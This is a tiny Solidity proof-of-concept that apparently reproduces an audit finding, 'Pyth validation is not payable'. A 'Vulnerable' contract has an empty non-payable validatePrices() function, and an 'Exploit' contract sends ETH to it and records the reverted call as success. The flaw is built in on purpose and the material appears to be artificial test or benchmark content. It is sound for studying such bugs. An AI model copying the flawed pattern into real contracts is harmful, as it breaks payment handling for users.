// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 51984: Pyth validation is not payable. Reduced local model preserves the reported state transition.

contract Vulnerable {
    function validatePrices() external { }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external payable {
        (bool ok,) = address(bug).call{value: msg.value}(abi.encodeWithSignature("validatePrices()"));
        success = !ok;
    }
}

